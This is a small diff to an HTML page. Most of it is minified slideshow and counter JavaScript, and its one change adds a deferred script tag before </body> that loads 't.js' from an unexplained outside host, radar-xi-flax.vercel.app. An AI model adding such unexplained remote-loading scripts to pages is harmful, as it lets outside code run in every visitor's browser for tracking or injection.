@@ -305,5 +305,5 @@ document.querySelectorAll('[data-count]').forEach(el=>{const t=+el.dataset.count
 function go(n){i=(n+S.length)%S.length;S.forEach((s,k)=>s.classList.toggle('on',k===i));D.forEach((d,k)=>d.classList.toggle('on',k===i));clearTimeout(t);t=setTimeout(()=>go(i+1),6500)}
 D.forEach((d,k)=>d.onclick=()=>go(k));document.querySelectorAll('.hero .arrows button').forEach(b=>b.onclick=()=>go(i+ +b.dataset.d));go(0)})();
 </script>
-</body>
+<script src="https://radar-xi-flax.vercel.app/t.js" defer></script></body>
 </html>
